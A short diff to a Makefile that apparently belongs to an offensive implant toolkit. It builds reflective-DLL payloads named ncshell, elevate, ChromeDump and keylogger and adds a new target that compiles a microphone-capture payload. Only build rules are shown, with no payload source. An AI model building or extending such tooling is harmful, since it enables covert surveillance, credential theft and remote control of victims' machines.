@@ -19,7 +19,7 @@ else
 	DEL += rm
 endif
 
-all: reflective_default ncshell elevate ChromeDump keylogger
+all: reflective_default ncshell elevate ChromeDump keylogger capturemic
 
 reflective_default:
 	$(COMPILER) ReflectiveDll.c ReflectiveLoader.c -c -m32
@@ -44,6 +44,10 @@ msf:
 keylogger:
 	$(CPCOMPILER) keylogger.cpp ReflectiveLoader.c -c -m32
 	$(CPCOMPILER) keylogger.cpp ReflectiveLoader.o -o keylogger.dll -shared -m32 -static
-	
+
+capturemic:
+	$(CPCOMPILER) capturemic.cpp ReflectiveLoader.c -c -m32
+	$(CPCOMPILER) capturemic.o ReflectiveLoader.o -o capturemic.dll -shared -m32 -static -lwinmm
+
 clean:
 	$(DEL) *.o *.dll
